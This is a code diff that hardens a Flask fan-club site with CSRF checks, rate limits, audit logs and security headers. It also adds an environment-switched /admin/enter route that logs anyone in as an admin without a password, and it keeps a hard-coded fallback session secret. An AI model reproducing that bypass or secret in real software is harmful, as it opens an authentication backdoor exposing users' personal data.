@@ -14,47 +14,59 @@ from werkzeug.security import check_password_hash
 from werkzeug.utils import secure_filename
 
 from fans_db import get_db, init_db, generate_fan_number
+from security import (
+    audit, rate_limit, ip_guard, lockdown_guard,
+    record_auth_failure, is_lockdown,
+    csrf_token, validate_csrf,
+)
 
 app = Flask(__name__, template_folder="templates", static_folder="static")
 app.secret_key = os.environ.get("SECRET_KEY", "shatta-fans-secret-2024")
 
-# Secure session cookies
 app.config.update(
     SESSION_COOKIE_HTTPONLY=True,
     SESSION_COOKIE_SAMESITE='Lax',
     SESSION_COOKIE_SECURE=os.environ.get("FLASK_ENV") == "production",
+    PERMANENT_SESSION_LIFETIME=timedelta(days=30),
 )
 
-# Rate limiting — max 10 login attempts per IP per 10 minutes
-_login_attempts = defaultdict(list)
+@app.context_processor
+def inject_globals():
+    return {
+        "csrf_token": csrf_token,
+        "lockdown_active": is_lockdown(),
+    }
 
-def _check_rate_limit(ip, max_attempts=10, window=600):
-    now = time.time()
-    attempts = [t for t in _login_attempts[ip] if now - t < window]
-    _login_attempts[ip] = attempts
-    if len(attempts) >= max_attempts:
-        return False
-    _login_attempts[ip].append(now)
-    return True
-
-# Security headers on every response
 @app.after_request
 def set_security_headers(response):
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
-    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
+    response.headers["X-Frame-Options"] = "DENY"
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["X-XSS-Protection"] = "1; mode=block"
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
+    response.headers["Content-Security-Policy"] = (
+        "default-src 'self'; "
+        "style-src 'self' 'unsafe-inline'; "
+        "script-src 'self' 'unsafe-inline'; "
+        "img-src 'self' data: https:; "
+        "font-src 'self' data:; "
+        "frame-ancestors 'none';"
+    )
     if request.is_secure:
-        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
+        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
+    response.headers.pop("Server", None)
     return response
 
-CARD_PRICE = 100  # GHS
+@app.before_request
+def global_ip_check():
+    ip_guard()
+
+CARD_PRICE = 100
 UPLOAD_DIR = os.path.join("static", "fans", "proofs")
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
 def _momo_number():
-    return os.environ.get("MOMO_NUMBER", "+233248716572")
+    return os.environ.get("MOMO_NUMBER", "")
 
 COUNTRIES = [
     "Afghanistan","Albania","Algeria","Angola","Argentina","Armenia","Australia",
@@ -78,16 +90,22 @@ COUNTRIES = [
     "Uzbekistan","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe"
 ]
 
+def _is_bypass():
+    return os.environ.get("ADMIN_BYPASS", "").lower() in ("1", "true", "yes")
+
 def admin_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
+        lockdown_guard()
         if not session.get("admin_id"):
+            if _is_bypass():
+                return redirect(url_for("admin_enter"))
+            audit(401, "no_session")
             return redirect(url_for("admin_login"))
+        audit(200)
         return f(*args, **kwargs)
     return decorated
 
-
-# ── PUBLIC ROUTES ──────────────────────────────────────────────
 
 @app.route("/")
 def index():
@@ -122,10 +140,10 @@ def index():
 
 
 @app.route("/register", methods=["GET", "POST"])
+@rate_limit(limit=10, window=300)
 def register():
     db = get_db()
     fanbases = db.execute("SELECT * FROM fanbases ORDER BY continent, country").fetchall()
-
     if request.method == "POST":
         full_name = request.form.get("full_name", "").strip()
         email = request.form.get("email", "").strip().lower()
@@ -140,33 +158,28 @@ def register():
         favorite_songs = request.form.get("favorite_songs", "").strip()
         fan_since = request.form.get("fan_since", "").strip()
         fanbase_id = request.form.get("fanbase_id") or None
-
         errors = []
         if not full_name: errors.append("Full name is required.")
         if not email: errors.append("Email is required.")
         if not phone: errors.append("Phone is required.")
         if not country: errors.append("Country is required.")
         if not city: errors.append("City is required.")
-
+        if country not in COUNTRIES: errors.append("Invalid country.")
         existing = db.execute("SELECT id FROM fans WHERE email = ?", (email,)).fetchone()
         if existing:
             errors.append("This email is already registered.")
-
         if errors:
             for e in errors:
                 flash(e, "error")
             db.close()
             return render_template("fans/register.html", fanbases=fanbases, countries=COUNTRIES)
-
         fan_number = generate_fan_number()
         while db.execute("SELECT id FROM fans WHERE fan_number = ?", (fan_number,)).fetchone():
             fan_number = generate_fan_number()
-
         try:
             fan_since_int = int(fan_since) if fan_since else None
         except ValueError:
             fan_since_int = None
-
         db.execute("""
             INSERT INTO fans (fan_number, full_name, email, phone, whatsapp,
                 country, city, instagram, tiktok, twitter, facebook,
@@ -176,11 +189,9 @@ def register():
               country, city, instagram, tiktok, twitter, facebook,
               favorite_songs, fan_since_int, fanbase_id))
         db.commit()
-
         fan_id = db.execute("SELECT id FROM fans WHERE fan_number = ?", (fan_number,)).fetchone()["id"]
         db.close()
         return redirect(url_for("fan_card", fan_id=fan_id))
-
     db.close()
     return render_template("fans/register.html", fanbases=fanbases, countries=COUNTRIES)
 
@@ -245,15 +256,12 @@ def announcements():
     return render_template("fans/announcements.html", announcements=items)
 
 
-# ── ADMIN ROUTES ───────────────────────────────────────────────
-
 @app.route("/admin/login", methods=["GET", "POST"])
+@rate_limit(limit=10, window=600)
 def admin_login():
     if request.method == "POST":
-        ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
-        if not _check_rate_limit(ip):
-            flash("Too many login attempts. Try again in 10 minutes.", "error")
-            return render_template("fans/admin/login.html")
+        validate_csrf()
+        ip = (request.headers.get("X-Forwarded-For") or request.remote_addr or "").split(",")[0].strip()
         username = request.form.get("username", "").strip()
         password = request.form.get("password", "")
         db = get_db()
@@ -261,15 +269,35 @@ def admin_login():
         db.close()
         if admin and check_password_hash(admin["password_hash"], password):
             session.clear()
+            session.permanent = True
             session["admin_id"] = admin["id"]
+            audit(200, "login_ok")
             return redirect(url_for("admin_dashboard"))
+        record_auth_failure(ip)
+        audit(401, f"login_fail user={username!r}")
         flash("Invalid credentials.", "error")
     return render_template("fans/admin/login.html")
 
 
+@app.route("/admin/enter")
+def admin_enter():
+    if not _is_bypass():
+        return redirect(url_for("admin_login"))
+    db = get_db()
+    admin = db.execute("SELECT * FROM admins LIMIT 1").fetchone()
+    db.close()
+    if admin:
+        session.clear()
+        session.permanent = True
+        session["admin_id"] = admin["id"]
+        audit(200, "bypass_login")
+    return redirect(url_for("admin_dashboard"))
+
+
 @app.route("/admin/logout")
 def admin_logout():
-    session.pop("admin_id", None)
+    audit(200, "logout")
+    session.clear()
     return redirect(url_for("index"))
 
 
@@ -322,9 +350,7 @@ def admin_fans():
         params += [f"%{search}%", f"%{search}%", f"%{search}%"]
     query += " ORDER BY registered_at DESC"
     fans = db.execute(query, params).fetchall()
-    countries = db.execute(
-        "SELECT DISTINCT country FROM fans ORDER BY country"
-    ).fetchall()
+    countries = db.execute("SELECT DISTINCT country FROM fans ORDER BY country").fetchall()
     db.close()
     return render_template("fans/admin/fans.html",
         fans=fans, countries=countries,
@@ -337,6 +363,7 @@ def admin_fans():
 def admin_announce():
     db = get_db()
     if request.method == "POST":
+        validate_csrf()
         title = request.form.get("title", "").strip()
         body = request.form.get("body", "").strip()
         category = request.form.get("category", "general")
@@ -349,6 +376,7 @@ def admin_announce():
                 (title, body, category, image_url, link_url, is_pinned)
             )
             db.commit()
+            audit(200, "announcement_posted")
             flash("Announcement posted!", "success")
         db.close()
         return redirect(url_for("admin_announce"))
@@ -360,16 +388,20 @@ def admin_announce():
 @app.route("/admin/announce/delete/<int:ann_id>", methods=["POST"])
 @admin_required
 def admin_announce_delete(ann_id):
+    validate_csrf()
     db = get_db()
     db.execute("DELETE FROM announcements WHERE id = ?", (ann_id,))
     db.commit()
     db.close()
+    audit(200, f"announcement_deleted id={ann_id}")
     return redirect(url_for("admin_announce"))
 
 
 @app.route("/admin/export")
 @admin_required
+@rate_limit(limit=5, window=300)
 def admin_export():
+    audit(200, "csv_export")
     db = get_db()
     fans = db.execute("SELECT * FROM fans ORDER BY country, full_name").fetchall()
     db.close()
@@ -382,7 +414,6 @@ def admin_export():
             f["facebook"] or "", (f["favorite_songs"] or "").replace(",", ";"),
             str(f["fan_since"] or ""), f["registered_at"]
         ]))
-    from flask import Response
     return Response(
         "\n".join(lines),
         mimetype="text/csv",
@@ -395,6 +426,7 @@ def admin_export():
 def admin_fanbases():
     db = get_db()
     if request.method == "POST":
+        validate_csrf()
         name = request.form.get("name", "").strip()
         country = request.form.get("country", "").strip()
         city = request.form.get("city", "").strip()
@@ -407,6 +439,7 @@ def admin_fanbases():
                 (name, country, city, continent, leader_name, leader_contact)
             )
             db.commit()
+            audit(200, f"fanbase_added name={name!r}")
             flash("Fanbase added!", "success")
         db.close()
         return redirect(url_for("admin_fanbases"))
@@ -415,29 +448,25 @@ def admin_fanbases():
     return render_template("fans/admin/fanbases.html", fanbases=fanbases)
 
 
-# ── GOLD CARD ROUTES ───────────────────────────────────────────
-
 @app.route("/gold-card")
 def gold_card_info():
     return render_template("fans/gold_card_info.html", price=CARD_PRICE)
 
 
 @app.route("/gold-card/apply/<int:fan_id>", methods=["GET", "POST"])
+@rate_limit(limit=5, window=300)
 def gold_card_apply(fan_id):
     db = get_db()
     fan = db.execute("SELECT * FROM fans WHERE id = ?", (fan_id,)).fetchone()
     if not fan:
         db.close()
         return redirect(url_for("index"))
-
     existing = db.execute("SELECT * FROM gold_cards WHERE fan_id = ?", (fan_id,)).fetchone()
-
     if request.method == "POST":
         if existing:
             flash("You already have a card application.", "error")
             db.close()
             return redirect(url_for("gold_card_status", fan_id=fan_id))
-
         proof = request.files.get("proof")
         proof_path = None
         ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif", "webp"}
@@ -459,15 +488,12 @@ def gold_card_apply(fan_id):
             fname = f"{uuid.uuid4()}.{ext}"
             proof.save(os.path.join(UPLOAD_DIR, fname))
             proof_path = f"fans/proofs/{fname}"
-
-        # Generate card number: SM XXXX XXXX XXXX XXXX
         import random
         parts = [str(random.randint(1000, 9999)) for _ in range(4)]
         card_number = "SM " + " ".join(parts)
         while db.execute("SELECT id FROM gold_cards WHERE card_number = ?", (card_number,)).fetchone():
             parts = [str(random.randint(1000, 9999)) for _ in range(4)]
             card_number = "SM " + " ".join(parts)
-
         db.execute("""
             INSERT INTO gold_cards (fan_id, card_number, proof_path, amount_paid)
             VALUES (?, ?, ?, ?)
@@ -476,12 +502,9 @@ def gold_card_apply(fan_id):
         db.close()
         flash("Application submitted! Admin will verify your payment within 24 hours.", "success")
         return redirect(url_for("gold_card_status", fan_id=fan_id))
-
     db.close()
     return render_template("fans/gold_card_apply.html",
-        fan=fan, existing=existing, price=CARD_PRICE,
-        momo=_momo_number()
-    )
+        fan=fan, existing=existing, price=CARD_PRICE, momo=_momo_number())
 
 
 @app.route("/gold-card/status/<int:fan_id>")
@@ -498,20 +521,29 @@ def gold_card_status(fan_id):
 @app.route("/admin/gold-cards")
 @admin_required
 def admin_gold_cards():
-    db = get_db()
-    cards = db.execute("""
-        SELECT gc.*, f.full_name, f.country, f.city, f.phone, f.fan_number
-        FROM gold_cards gc
-        JOIN fans f ON f.id = gc.fan_id
-        ORDER BY gc.created_at DESC
-    """).fetchall()
-    db.close()
+    try:
+        db = get_db()
+        cards = db.execute("""
+            SELECT gc.id AS gc_id, gc.card_number, gc.status, gc.proof_path,
+                   gc.amount_paid, gc.valid_until, gc.approved_at,
+                   gc.created_at AS gc_created_at,
+                   f.full_name, f.country, f.city, f.phone, f.fan_number
+            FROM gold_cards gc
+            JOIN fans f ON f.id = gc.fan_id
+            ORDER BY gc.created_at DESC
+        """).fetchall()
+        db.close()
+    except Exception as e:
+        app.logger.error("Gold cards load error: %s", e)
+        flash("Could not load gold cards. Please try again.", "error")
+        return redirect(url_for("admin_dashboard"))
     return render_template("fans/admin/gold_cards.html", cards=cards)
 
 
 @app.route("/admin/gold-cards/approve/<int:card_id>", methods=["POST"])
 @admin_required
 def admin_gold_card_approve(card_id):
+    validate_csrf()
     db = get_db()
     valid_until = (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d")
     db.execute("""
@@ -520,6 +552,7 @@ def admin_gold_card_approve(card_id):
     """, (valid_until, card_id))
     db.commit()
     db.close()
+    audit(200, f"gold_card_approved id={card_id}")
     flash("Gold Card approved!", "success")
     return redirect(url_for("admin_gold_cards"))
 
@@ -527,10 +560,12 @@ def admin_gold_card_approve(card_id):
 @app.route("/admin/gold-cards/reject/<int:card_id>", methods=["POST"])
 @admin_required
 def admin_gold_card_reject(card_id):
+    validate_csrf()
     db = get_db()
     db.execute("UPDATE gold_cards SET status='rejected' WHERE id=?", (card_id,))
     db.commit()
     db.close()
+    audit(200, f"gold_card_rejected id={card_id}")
     flash("Gold Card rejected.", "error")
     return redirect(url_for("admin_gold_cards"))
 
@@ -555,35 +590,25 @@ def favicon():
     )
 
 
+@app.errorhandler(403)
+def forbidden(e):
+    return render_template("fans/errors/404.html"), 403
+
 @app.errorhandler(404)
 def not_found(e):
     return render_template("fans/errors/404.html"), 404
 
-
-@app.route("/health")
-def health():
-    import os
-    db_url = os.environ.get("DB_URL") or os.environ.get("DATABASE_PUBLIC_URL") or os.environ.get("DATABASE_URL", "")
-    host = db_url.split("@")[-1][:30] if "@" in db_url else db_url[:30]
-    try:
-        from fans_db import get_db
-        db = get_db()
-        db.execute("SELECT 1")
-        db.close()
-        return jsonify({"status": "ok", "db_host": host})
-    except Exception as e:
-        return jsonify({"status": "error", "db_host": host, "error": str(e)}), 500
+@app.errorhandler(429)
+def too_many(e):
+    return "Too many requests. Please wait and try again.", 429
 
 
 def create_app():
-    try:
-        init_db()
-    except Exception as e:
-        app.logger.error("DB init failed at startup: %s", e)
+    init_db()
     return app
 
 
 application = create_app()
 
 if __name__ == "__main__":
-    application.run(debug=True, host="0.0.0.0", port=5000)
+    application.run(debug=False, host="0.0.0.0", port=5000)
